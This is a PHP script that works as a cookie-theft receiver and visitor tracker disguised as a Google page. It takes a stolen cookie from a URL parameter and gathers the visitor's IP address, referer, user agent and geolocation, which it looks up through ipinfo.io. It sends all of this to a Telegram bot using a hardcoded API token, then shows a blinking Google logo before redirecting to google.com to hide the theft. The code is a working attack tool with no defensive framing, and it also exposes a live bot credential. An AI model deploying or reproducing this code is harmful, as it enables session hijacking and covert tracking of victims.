<?php
function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$cookie = "Cookie IS : " . $_GET['cookie'];
$victimIP = "IP Adress : " . $_SERVER['REMOTE_ADDR'];
$Ref = "User Comes From : " . $_SERVER['HTTP_REFERER'];
$serverName = "Server Name IS : " . $_SERVER['SERVER_NAME'];
$serverAddr = "Server IP Adress IS : " . $_SERVER['SERVER_ADDR'];
$userAgent = "User Info : " . $_SERVER['HTTP_USER_AGENT'];
$PublicIP = get_client_ip();
$json = file_get_contents("http://ipinfo.io/$PublicIP/geo");
$json = json_decode($json, true);
$country = "User Country IS : " . $json['country'];
$region = "User Region IS : " . $json['region'];
$city = "User city IS : " . $json['city'];
$loc = "User Location Map IS : " . "http://www.google.com/maps/place/" . $json['loc'];
$postal = "User ZIP IS : " . $json['postal'];
$timezone = "User TimeZone IS : " . $json['timezone'];
$hostname = "User hostname IP IS : " . $json['hostname'];
$org = "\nAnd org of Host IS : " . $json['org'];

// les drapeaux selon le pays
$flags = [
	'AF' => '🇦🇫','AX' => '🇦🇽','AL' => '🇦🇱','DZ' => '🇩🇿','AS' => '🇦🇸','AD' => '🇦🇩','AO' => '🇦🇴','AI' => '🇦🇮','AQ' => '🇦🇶','AG' => '🇦🇬','AR' => '🇦🇷','AM' => '🇦🇲','AW' => '🇦🇼','AU' => '🇦🇺','AT' => '🇦🇹','AZ' => '🇦🇿','BS' => '🇧🇸','BH' => '🇧🇭','BD' => '🇧🇩','BB' => '🇧🇧','BY' => '🇧🇾','BE' => '🇧🇪','BZ' => '🇧🇿','BJ' => '🇧🇯','BM' => '🇧🇲','BT' => '🇧🇹','BO' => '🇧🇴','BA' => '🇧🇦','BW' => '🇧🇼','BV' => '🇧🇻','BR' => '🇧🇷','IO' => '🇮🇴','BN' => '🇧🇳','BG' => '🇧🇬','BF' => '🇧🇫','BI' => '🇧🇮','KH' => '🇰🇭','CM' => '🇨🇲','CA' => '🇨🇦','CV' => '🇨🇻','KY' => '🇰🇾','CF' => '🇨🇫','TD' => '🇹🇩','CL' => '🇨🇱','CN' => '🇨🇳','CX' => '🇨🇽','CC' => '🇨🇨','CO' => '🇨🇴','KM' => '🇰🇲','CG' => '🇨🇬','CD' => '🇨🇩','CK' => '🇨🇰','CR' => '🇨🇷','CI' => '🇨🇮','HR' => '🇭🇷','CU' => '🇨🇺','CY' => '🇨🇾','CZ' => '🇨🇿','DK' => '🇩🇰','DJ' => '🇩🇯','DM' => '🇩🇲','DO' => '🇩🇴','EC' => '🇪🇨','EG' => '🇪🇬','SV' => '🇸🇻','GQ' => '🇬🇶','ER' => '🇪🇷','EE' => '🇪🇪','ET' => '🇪🇹','FK' => '🇫🇰','FO' => '🇫🇴','FJ' => '🇫🇯','FI' => '🇫🇮','FR' => '🇫🇷','GF' => '🇬🇫','PF' => '🇵🇫','TF' => '🇹🇫','GA' => '🇬🇦','GM' => '🇬🇲','GE' => '🇬🇪','DE' => '🇩🇪','GH' => '🇬🇭','GI' => '🇬🇮','GR' => '🇬🇷','GL' => '🇬🇱','GD' => '🇬🇩','GP' => '🇬🇵','GU' => '🇬🇺','GT' => '🇬🇹','GG' => '🇬🇬','GN' => '🇬🇳','GW' => '🇬🇼','GY' => '🇬🇾','HT' => '🇭🇹','HM' => '🇭🇲','VA' => '🇻🇦','HN' => '🇭🇳','HK' => '🇭🇰','HU' => '🇭🇺','IS' => '🇮🇸','IN' => '🇮🇳','ID' => '🇮🇩','IR' => '🇮🇷','IQ' => '🇮🇶','IE' => '🇮🇪','IM' => '🇮🇲','IL' => '🇮🇱','IT' => '🇮🇹','JM' => '🇯🇲','JP' => '🇯🇵','JE' => '🇯🇪','JO' => '🇯🇴','KZ' => '🇰🇿','KE' => '🇰🇪','KI' => '🇰🇮','KP' => '🇰🇵','KR' => '🇰🇷','KW' => '🇰🇼','KG' => '🇰🇬','LA' => '🇱🇦','LV' => '🇱🇻','LB' => '🇱🇧','LS' => '🇱🇸','LR' => '🇱🇷','LY' => '🇱🇾','LI' => '🇱🇮','LT' => '🇱🇹','LU' => '🇱🇺','MO' => '🇲🇴','MK' => '🇲🇰','MG' => '🇲🇬','MW' => '🇲🇼','MY' => '🇲🇾','MV' => '🇲🇻','ML' => '🇲🇱','MT' => '🇲🇹','MH' => '🇲🇭','MQ' => '🇲🇶','MR' => '🇲🇷','MU' => '🇲🇺','YT' => '🇾🇹','MX' => '🇲🇽','FM' => '🇫🇲','MD' => '🇲🇩','MC' => '🇲🇨','MN' => '🇲🇳','ME' => '🇲🇪','MS' => '🇲🇸','MA' => '🇲🇦','MZ' => '🇲🇿','MM' => '🇲🇲','NA' => '🇳🇦','NR' => '🇳🇷','NP' => '🇳🇵','NL' => '🇳🇱','AN' => '🇦🇳','NC' => '🇳🇨','NZ' => '🇳🇿','NI' => '🇳🇮','NE' => '🇳🇪','NG' => '🇳🇬','NU' => '🇳🇺','NF' => '🇳🇫','MP' => '🇲🇵','NO' => '🇳🇴','OM' => '🇴🇲','PK' => '🇵🇰','PW' => '🇵🇼','PS' => '🇵🇸','PA' => '🇵🇦','PG' => '🇵🇬','PY' => '🇵🇾','PE' => '🇵🇪','PH' => '🇵🇭','PN' => '🇵🇳','PL' => '🇵🇱','PT' => '🇵🇹','PR' => '🇵🇷','QA' => '🇶🇦','RE' => '🇷🇪','RO' => '🇷🇴','RU' => '🇷🇺','RW' => '🇷🇼','BL' => '🇧🇱','SH' => '🇸🇭','KN' => '🇰🇳','LC' => '🇱🇨','MF' => '🇲🇫','PM' => '🇵🇲','VC' => '🇻🇨','WS' => '🇼🇸','SM' => '🇸🇲','ST' => '🇸🇹','SA' => '🇸🇦','SN' => '🇸🇳','RS' => '🇷🇸','SC' => '🇸🇨','SL' => '🇸🇱','SG' => '🇸🇬','SK' => '🇸🇰','SI' => '🇸🇮','SB' => '🇸🇧','SO' => '🇸🇴','ZA' => '🇿🇦','GS' => '🇬🇸','SS' => '🇸🇸','ES' => '🇪🇸','LK' => '🇱🇰','SD' => '🇸🇩','SR' => '🇸🇷','SJ' => '🇸🇯','SZ' => '🇸🇿','SE' => '🇸🇪','CH' => '🇨🇭','SY' => '🇸🇾','TW' => '🇹🇼','TJ' => '🇹🇯','TZ' => '🇹🇿','TH' => '🇹🇭','TL' => '🇹🇱','TG' => '🇹🇬','TK' => '🇹🇰','TO' => '🇹🇴','TT' => '🇹🇹','TN' => '🇹🇳','TR' => '🇹🇷','TM' => '🇹🇲','TC' => '🇹🇨','TV' => '🇹🇻','UG' => '🇺🇬','UA' => '🇺🇦','AE' => '🇦🇪','GB' => '🇬🇧','US' => '🇺🇸','UM' => '🇺🇲','UY' => '🇺🇾','UZ' => '🇺🇿','VU' => '🇻🇺','VE' => '🇻🇪','VN' => '🇻🇳','VG' => '🇻🇬','VI' => '🇻🇮','WF' => '🇼🇫','EH' => '🇪🇭','YE' => '🇾🇪','ZM' => '🇿🇲','ZW' => '🇿🇼',
];

if (isset($flags[$json['country']])) {
    $country .= ' ' . $flags[$json['country']];
}

$msg = "-----{===--{ Nevo Info }--===}-----" . "\n\n" . $cookie . "\n\n" . $victimIP . "\n\n" . $Ref . "\n\n" . $serverName . "\n\n" . $serverAddr . "\n\n" . $userAgent . "\n\n" . "\n\n" . $PublicIP . "\n\n" . $flags[$json['country']] . ":" . $country . "\n\n" . $region . "\n\n" . $city . "\n\n" . $loc . "\n\n" . $postal . "\n\n" . $timezone . "\n\n" . $hostname . $org . "\n\n" . "-----{===--{ Nevo Info }--===}-----";

$bot_id = "-1001874783762";
$url = 'https://api.telegram.org/bot6122428056:AAGnIMsjHzFpM9taaSTzdvFsJGNaTmvjZCY/sendMessage';

$data = [
    'chat_id' => $bot_id,
    'text' => $msg
];

$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
    ],
];
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
    <link rel="icon" href="https://www.shareicon.net/data/2016/07/10/119930_google_512x512.png" type="image/x-icon" />
    <meta http-equiv="refresh" content="2; url=https://www.google.com/">
    <title>Google</title>
    <style>
        body {
            background-color: #2E4369;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 10%;
            height: 10%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: blink 4s linear infinite;
        }

        @keyframes blink {
            50% {
                opacity: 0;
            }
        }
    </style>
</head>

<body>
    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" alt="Load">
    </div>
</body>

</html>
